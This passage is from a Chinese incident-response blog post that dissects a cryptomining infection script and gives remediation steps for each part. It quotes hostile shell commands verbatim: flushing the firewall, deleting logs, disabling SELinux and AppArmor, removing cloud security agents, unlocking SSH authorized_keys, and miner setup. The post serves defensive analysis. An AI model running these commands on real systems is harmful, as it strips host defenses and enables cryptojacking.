class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="恶意代码分析" tabindex="-1"><a class="header-anchor" href="#恶意代码分析"><span>恶意代码分析</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>这段代码是一个 Bash 脚本，用于检测系统中是否存在一系列文件，并根据文件的存在与否执行相应的操作。脚本的大致逻辑如下：</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>1. 首先，通过一系列条件判断检查系统中是否存在特定的文件（文件名），这些文件名都与加密货币相关。</span></span>
+<span class="line"><span>2. 如果找到其中一个文件，表示系统中可能正在运行加密货币软件，脚本会输出 &quot;Crypto running&quot;，然后执行以下操作：</span></span>
+<span class="line"><span>   - 向 `6nj0me.xxx.io` 发送请求（可能用于跟踪感染的主机）。</span></span>
+<span class="line"><span>   - 从 `http://XX.XX.XX.XX/php/php.sh` 下载一个 PHP 脚本，并执行它（可能用于安装恶意软件或挖矿程序）。</span></span>
+<span class="line"><span>   - 清除命令历史记录，使用 `history -c` 命令删除执行过的命令记录，以尽量隐藏操作。</span></span>
+<span class="line"><span>3. 如果没有找到上述任何文件，脚本会输出 &quot;not Crypto running&quot;。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>需要注意的是，这段代码的意图看起来是在检查系统中是否存在特定的文件，如果存在，则执行一些恶意操作。这可能是一种恶意软件或入侵活动。如果你发现类似的代码在你的系统上运行，强烈建议立即采取行动，清除恶意脚本，并采取措施来保护你的系统。如果不确定如何处理，请寻求专业的技术支持。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-1" tabindex="-1"><a class="header-anchor" href="#解决-1"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>find /home -maxdepth 6 -name &#39;trc20usdt&#39;</span></span>
+<span class="line"><span>find / -maxdepth 6 -name &#39;trc20usdt&#39;</span></span>
+<span class="line"><span>find /  -maxdepth 6 -name &#39;ethers&#39;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>搜索不到什么。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_3-判断xmrig-log" tabindex="-1"><a class="header-anchor" href="#_3-判断xmrig-log"><span>3.判断xmrig.log</span></a></h2><h3 id="恶意代码-2" tabindex="-1"><a class="header-anchor" href="#恶意代码-2"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>if [ -f &quot;/etc/.system/php/xmrig.log&quot; ]</span></span>
+<span class="line"><span>then</span></span>
+<span class="line"><span>    echo &quot;process possible running&quot;</span></span>
+<span class="line"><span>    current=$(date +%s)</span></span>
+<span class="line"><span>    last_modified=$(stat -c &quot;%Y&quot; /etc/.system/php/xmrig.log)</span></span>
+<span class="line"><span>   if [ $(($current-$last_modified)) -gt 600 ]; then</span></span>
+<span class="line"><span>        echo &quot;no rr process running&quot;;</span></span>
+<span class="line"><span>    else</span></span>
+<span class="line"><span>    echo &quot;rr process running&quot;</span></span>
+<span class="line"><span>    exit 1</span></span>
+<span class="line"><span>   fi</span></span>
+<span class="line"><span>else </span></span>
+<span class="line"><span>    echo &quot;rr process not running&quot;</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>解释：</span></span>
+<span class="line"><span>这段代码用于检查一个特定的日志文件是否存在，然后检查该文件的上次修改时间，如果文件的上次修改时间超过10分钟，脚本会打印 &quot;no rr process running&quot;，表示未发现 &quot;rr&quot; 进程正在运行。如果文件的上次修改时间在10分钟之内，脚本会打印 &quot;rr process running&quot;，并退出脚本。如果文件不存在，则脚本会打印 &quot;rr process not running&quot;。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_4-iptables-f" tabindex="-1"><a class="header-anchor" href="#_4-iptables-f"><span>4.iptables -F</span></a></h2><p>当你运行 iptables -F 命令时，它会清空（删除）当前已经定义的所有规则，恢复防火墙到初始状态。这将导致系统的防火墙规则被移除，网络流量将不再受到任何防火墙规则的限制。换句话说，所有之前定义的规则都将被删除，允许所有的网络流量自由通过。</p><h3 id="恶意代码-3" tabindex="-1"><a class="header-anchor" href="#恶意代码-3"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>iptables -F</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_5-关闭防火墙和安全软件等" tabindex="-1"><a class="header-anchor" href="#_5-关闭防火墙和安全软件等"><span>5.关闭防火墙和安全软件等</span></a></h2><h3 id="恶意代码-4" tabindex="-1"><a class="header-anchor" href="#恶意代码-4"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>export RRHOME=/etc/.system/php</span></span>
+<span class="line"><span>rm -rf $RRHOME</span></span>
+<span class="line"><span>mkdir $RRHOME -p</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>rm -rf /var/log/syslog</span></span>
+<span class="line"><span>chattr -iua /tmp/     # 允许对 /tmp/ 目录进行修改、更新和追加操作</span></span>
+<span class="line"><span>chattr -iua /var/tmp/ # 使用 chattr 命令修改 /var/tmp/ 目录的属性，取消不可修改、不可更新和不可追加属性。</span></span>
+<span class="line"><span>ufw disable #  关闭Ubuntu的防火墙， Uncomplicated Firewall（UFW），这是一个用于配置 iptables 防火墙规则的前端工具。</span></span>
+<span class="line"><span>iptables -F  # iptables -F是用于清除所有的防火墙规则和计数器，即将所有的iptables规则设置为默认值，从而可以清空当前的防火墙策略。</span></span>
+<span class="line"><span>sudo sysctl kernel.nmi_watchdog=0</span></span>
+<span class="line"><span>sysctl kernel.nmi_watchdog=0</span></span>
+<span class="line"><span>echo &#39;0&#39; &gt; /proc/sys/kernel/nmi_watchdog</span></span>
+<span class="line"><span>echo &#39;kernel.nmi_watchdog=0&#39; &gt;&gt;/etc/sysctl.conf</span></span>
+<span class="line"><span>这一系列操作似乎是用于禁用 NMI（Non-Maskable Interrupt）看门狗，在某些情况下可以防止系统被死锁等问题影响。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chattr -iae /root/.ssh/</span></span>
+<span class="line"><span>chattr -iae /root/.ssh/authorized_keys</span></span>
+<span class="line"><span>rm -rf /tmp/addres*</span></span>
+<span class="line"><span>rm -rf /tmp/walle*</span></span>
+<span class="line"><span>rm -rf /tmp/keys</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法" tabindex="-1"><a class="header-anchor" href="#解决方法"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>vi /etc/sysctl.conf</span></span>
+<span class="line"><span>kernel.nmi_watchdog=0 去掉</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &#39;1&#39; &gt; /proc/sys/kernel/nmi_watchdog</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_6-关闭某云的安全软件" tabindex="-1"><a class="header-anchor" href="#_6-关闭某云的安全软件"><span>6.关闭某云的安全软件</span></a></h2><h3 id="恶意代码-5" tabindex="-1"><a class="header-anchor" href="#恶意代码-5"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>if ps aux | grep -i &#39;[a]liyun&#39;; then</span></span>
+<span class="line"><span>  curl http://update.aegis.aliyun.com/download/uninstall.sh | bash</span></span>
+<span class="line"><span>  curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span></span>
+<span class="line"><span>  pkill aliyun-service</span></span>
+<span class="line"><span>  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span></span>
+<span class="line"><span>  rm -rf /usr/local/aegis*</span></span>
+<span class="line"><span>  systemctl stop aliyun.service</span></span>
+<span class="line"><span>  systemctl disable aliyun.service</span></span>
+<span class="line"><span>  service bcm-agent stop</span></span>
+<span class="line"><span>  yum remove bcm-agent -y</span></span>
+<span class="line"><span>  apt-get remove bcm-agent -y</span></span>
+<span class="line"><span>elif ps aux | grep -i &#39;[y]unjing&#39;; then</span></span>
+<span class="line"><span>  /usr/local/qcloud/stargate/admin/uninstall.sh</span></span>
+<span class="line"><span>  /usr/local/qcloud/YunJing/uninst.sh</span></span>
+<span class="line"><span>  /usr/local/qcloud/monitor/barad/admin/uninstall.sh</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then</span></span>
+<span class="line"><span>  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop &amp;&amp; /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove &amp;&amp; rm -rf /usr/local/cloudmonitor  </span></span>
+<span class="line"><span>else</span></span>
+<span class="line"><span>  export ARCH=amd64</span></span>
+<span class="line"><span>  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} ]; then</span></span>
+<span class="line"><span>    /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} stop &amp;&amp; /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} uninstall &amp;&amp; rm -rf /usr/local/cloudmonitor </span></span>
+<span class="line"><span>  else</span></span>
+<span class="line"><span>    echo &quot;ali cloud monitor not running&quot;</span></span>
+<span class="line"><span>  fi</span></span>
+<span class="line"><span>fi</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-2" tabindex="-1"><a class="header-anchor" href="#解决-2"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>这条没有生效，某的监控还是在运行</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ps aux | grep -i &#39;[a]liyun&#39;</span></span>
+<span class="line"><span>root     13457  0.5  0.2 101296  8900 ?        S&lt;sl Mar31 1000:29 /usr/local/aegis/aegis_client/aegis_11_55/AliYunDun</span></span>
+<span class="line"><span>root     13467  1.7  0.7 145768 26980 ?        S&lt;sl Mar31 3579:27 /usr/local/aegis/aegis_client/aegis_11_55/AliYunDunMonitor</span></span>
+<span class="line"><span>root     15055  0.0  0.1  43464  4528 ?        S&lt;sl May15 121:01 /usr/local/aegis/aegis_update/AliYunDunUpdate</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_7-禁用selinux-以及关闭aliyun-service" tabindex="-1"><a class="header-anchor" href="#_7-禁用selinux-以及关闭aliyun-service"><span>7.禁用SELinux 以及关闭aliyun.service</span></a></h2><h3 id="恶意代码-6" tabindex="-1"><a class="header-anchor" href="#恶意代码-6"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>setenforce 0</span></span>
+<span class="line"><span>echo SELINUX=disabled &gt;/etc/selinux/config</span></span>
+<span class="line"><span>service apparmor stop</span></span>
+<span class="line"><span>systemctl disable apparmor</span></span>
+<span class="line"><span>service aliyun.service stop</span></span>
+<span class="line"><span>systemctl disable aliyun.service</span></span>
+<span class="line"><span>ps aux | grep -v grep | grep &#39;aegis&#39; | awk &#39;{print $2}&#39; | xargs -I % kill -9 %</span></span>
+<span class="line"><span>ps aux | grep -v grep | grep &#39;Yun&#39; | awk &#39;{print $2}&#39; | xargs -I % kill -9 %</span></span>
+<span class="line"><span>rm -rf /usr/local/aegis</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解释</p><h3 id="解决-3" tabindex="-1"><a class="header-anchor" href="#解决-3"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>setenforce 0</span></span>
+<span class="line"><span>echo SELINUX=disabled &gt;/etc/selinux/config</span></span>
+<span class="line"><span>都是</span></span>
+<span class="line"><span>恢复之前的文件：</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># vi /etc/selinux/config</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>SELINUX=disabled</span></span>
+<span class="line"><span>SELINUXTYPE=targeted</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>systemctl disable apparmor</span></span>
+<span class="line"><span>恢复，本机没有安装，所以不生效。</span></span>
+<span class="line"><span>systemctl status apparmor</span></span>
+<span class="line"><span>systemctl enable apparmor</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>service aliyun.service stop</span></span>
+<span class="line"><span>systemctl disable aliyun.service</span></span>
+<span class="line"><span>恢复：</span></span>
+<span class="line"><span>systemctl start aliyun.service</span></span>
+<span class="line"><span>systemctl status aliyun.service</span></span>
+<span class="line"><span>systemctl enable aliyun.service</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>aegis目录没有被删掉。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># ll /usr/local/aegis</span></span>
+<span class="line"><span>total 28</span></span>
+<span class="line"><span>drwxr-xr-x 5 root root 4096 Mar 31 21:31 aegis_client</span></span>
+<span class="line"><span>srwxr-xr-x 1 root root    0 Mar 31 21:31 Aegis-&lt;Guid(5A2C30A2-A87D-490A-9281-6765EDAD7CBA)&gt;</span></span>
+<span class="line"><span>drwxr-xr-x 3 root root 4096 May 15 11:50 aegis_update</span></span>
+<span class="line"><span>drwxr-xr-x 3 root root 4096 Feb 10  2023 AliSecGuard</span></span>
+<span class="line"><span>drwxr-xr-x 5 root root 4096 Aug 17 11:55 globalcfg</span></span>
+<span class="line"><span>drwxr-xr-x 8 root root 4096 Aug 17 13:24 PythonLoader</span></span>
+<span class="line"><span>drwxr-xr-x 7 root root 4096 Apr 24 10:18 PythonLoaderTemp</span></span>
+<span class="line"><span>drwxr-xr-x 3 root root 4096 Dec 19  2021 SecureCheck</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_8-安装-mining-脚本" tabindex="-1"><a class="header-anchor" href="#_8-安装-mining-脚本"><span>8.安装 mining 脚本</span></a></h2><h3 id="恶意代码-7" tabindex="-1"><a class="header-anchor" href="#恶意代码-7"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#set up RR mining script</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ &quot;$(id -u)&quot; == &quot;0&quot; ]; then</span></span>
+<span class="line"><span>  echo &quot;WARNING: Generally it is not adviced to run this script under root&quot;</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>WALLET=123456789abcd #做了处理</span></span>
+<span class="line"><span>EMAIL=$1 # this one is optional</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># active 1GB pages</span></span>
+<span class="line"><span>sysctl -w vm.nr_hugepages=$(nproc)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);</span></span>
+<span class="line"><span>do</span></span>
+<span class="line"><span>    echo 3 &gt; &quot;$i/hugepages/hugepages-1048576kB/nr_hugepages&quot;;</span></span>
+<span class="line"><span>done</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &quot;1GB pages successfully enabled&quot;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># checking prerequisites</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ -z $WALLET ]; then</span></span>
+<span class="line"><span>  echo &quot;Script usage:&quot;</span></span>
+<span class="line"><span>  echo &quot;&gt; setup_rr_miner.sh &lt;wallet address&gt; [&lt;your email address&gt;]&quot;</span></span>
+<span class="line"><span>  echo &quot;ERROR: Please specify your wallet address&quot;</span></span>
+<span class="line"><span>  exit 1</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>WALLET_BASE=`echo $WALLET | cut -f1 -d&quot;.&quot;`</span></span>
+<span class="line"><span>if [ ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then</span></span>
+<span class="line"><span>  echo &quot;ERROR: Wrong wallet base address length (should be 95 or 34): ${#WALLET_BASE}&quot;</span></span>
+<span class="line"><span>  exit 1</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ -z $RRHOME ]; then</span></span>
+<span class="line"><span>  echo &quot;ERROR: Please define HOME environment variable to your home directory&quot;</span></span>
+<span class="line"><span>  exit 1</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ ! -d $RRHOME ]; then</span></span>
+<span class="line"><span>  echo &quot;ERROR: Please make sure HOME directory $RRHOME exists or set it yourself using this command:&quot;</span></span>
+<span class="line"><span>  echo &#39;  export RRHOME=&lt;dir&gt;&#39;</span></span>
+<span class="line"><span>  exit 1</span></span>
+<span class="line"><span>fi</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解释" tabindex="-1"><a class="header-anchor" href="#解释"><span>解释：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#set up RR mining script</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ &quot;$(id -u)&quot; == &quot;0&quot; ]; then</span></span>
+<span class="line"><span>  echo &quot;WARNING: Generally it is not adviced to run this script under root&quot;</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>判断用户如果是root，弹出警告，不建议用root用户运行。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>WALLET=123456789abcd #做了处理</span></span>
+<span class="line"><span>EMAIL=$1 # this one is optional</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># active 1GB pages</span></span>
+<span class="line"><span>sysctl -w vm.nr_hugepages=$(nproc)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);</span></span>
+<span class="line"><span>do</span></span>
+<span class="line"><span>    echo 3 &gt; &quot;$i/hugepages/hugepages-1048576kB/nr_hugepages&quot;;</span></span>
+<span class="line"><span>done</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &quot;1GB pages successfully enabled&quot;</span></span>
+<span class="line"><span>这段代码的目的是在系统上启用 1GB 大页面（Huge Pages），以提高大内存工作负载的性能和效率。它通过设置 Huge Pages 数目并针对每个 NUMA 节点进行配置来实现这一目标。这可能是在进行内存优化和性能调整时使用的一部分脚本。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># checking prerequisites</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ -z $WALLET ]; then</span></span>
+<span class="line"><span>  echo &quot;Script usage:&quot;</span></span>
+<span class="line"><span>  echo &quot;&gt; setup_rr_miner.sh &lt;wallet address&gt; [&lt;your email address&gt;]&quot;</span></span>
+<span class="line"><span>  echo &quot;ERROR: Please specify your wallet address&quot;</span></span>
+<span class="line"><span>  exit 1</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>这段代码用于检查用户在执行脚本时是否提供了有效的钱包地址（通过检查变量 $WALLET 是否为空）。如果用户未提供钱包地址，脚本将输出使用说明和示例命令，并输出错误消息，然后终止执行。这有助于确保脚本在正确的输入参数下才会继续执行，避免因缺少必要的信息而导致问题。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>WALLET_BASE=`echo $WALLET | cut -f1 -d&quot;.&quot;`</span></span>
+<span class="line"><span>if [ ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then</span></span>
+<span class="line"><span>  echo &quot;ERROR: Wrong wallet base address length (should be 95 or 34): ${#WALLET_BASE}&quot;</span></span>
+<span class="line"><span>  exit 1</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>这段代码用于检查给定的钱包地址的基本部分的长度是否符合要求。如果长度既不是 95 也不是 34，脚本将输出错误消息，并终止执行。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ -z $RRHOME ]; then</span></span>
+<span class="line"><span>  echo &quot;ERROR: Please define HOME environment variable to your home directory&quot;</span></span>
+<span class="line"><span>  exit 1</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>这段代码用于检查是否定义了环境变量 $RRHOME，并在该变量未定义时输出错误消息，然后终止执行</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ ! -d $RRHOME ]; then</span></span>
+<span class="line"><span>  echo &quot;ERROR: Please make sure HOME directory $RRHOME exists or set it yourself using this command:&quot;</span></span>
+<span class="line"><span>  echo &#39;  export RRHOME=&lt;dir&gt;&#39;</span></span>
+<span class="line"><span>  exit 1</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>跟上一段差不多。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-4" tabindex="-1"><a class="header-anchor" href="#解决-4"><span>解决</span></a></h3><p>基本只是检查条件，不需要安全操作</p><h2 id="_9-安装curl-wget" tabindex="-1"><a class="header-anchor" href="#_9-安装curl-wget"><span>9.安装curl, wget</span></a></h2><p>如果没有安装则安装 curl, wget</p><h3 id="恶意代码-8" tabindex="-1"><a class="header-anchor" href="#恶意代码-8"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#check curl, wget</span></span>
